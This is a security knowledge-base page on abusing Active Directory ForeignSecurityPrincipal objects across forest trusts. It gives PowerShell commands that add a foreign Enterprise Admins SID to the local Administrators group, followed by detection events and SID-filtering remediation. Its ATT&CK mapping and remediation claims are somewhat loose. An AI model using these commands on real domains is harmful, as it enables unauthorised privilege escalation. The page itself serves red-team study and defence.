# [PE-TOKEN-003]: ForeignSecurityPrincipal SID Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-003 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: SID-History Injection (T1134.005)](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD (Cross-Forest) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Foreign Security Principals (FSPs) are placeholders in Active Directory for users/groups from trusted domains. They map a foreign SID to a local object. If an attacker can create or modify FSPs (e.g., in the `CN=ForeignSecurityPrincipals` container), or add an existing FSP representing a high-privilege external group (e.g., Enterprise Admins of a trusted forest) to a local group, they can grant privileges to external accounts they control.
- **Attack Surface:** Trust Relationships & Group Memberships.
- **Business Impact:** **Cross-Forest Escalation**. Moving from a compromised child domain/forest to the parent/trusted forest.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Ability to modify group membership or create FSP objects.
- **Tools:**
    - PowerShell (ActiveDirectory Module)
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify Foreign SIDs**
Find SIDs of trusted domain admins.
```powershell
Get-ADTrust -Filter *
# Translate trusted domain SID + 519 (Enterprise Admins)
```

**Step 2: Add FSP to Local Group**
Add the foreign Enterprise Admin SID to the local "Administrators" group.
```powershell
$FSP = "CN=S-1-5-21-FOREIGN-DOMAIN-519,CN=ForeignSecurityPrincipals,DC=local,DC=com"
Add-ADGroupMember -Identity "Administrators" -Members $FSP
```
*Note: If the FSP object doesn't exist, AD might create it automatically when adding the SID.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4728 / 4732 / 4756 | Member Added to Security Group. Filter where `MemberName` contains `ForeignSecurityPrincipals`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **SID Filtering:** Enable "SID Filtering" (Quarantine) on Trust relationships. This strips high-privilege SIDs (like Enterprise Admins) from the PAC when crossing trust boundaries, preventing this abuse.
*   **Monitoring:** Alert on any addition of FSP objects to sensitive groups (Domain Admins, Administrators).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-003] (Trust Enumeration)
> **Next Logical Step:** [LAT-CLASSIC-001]
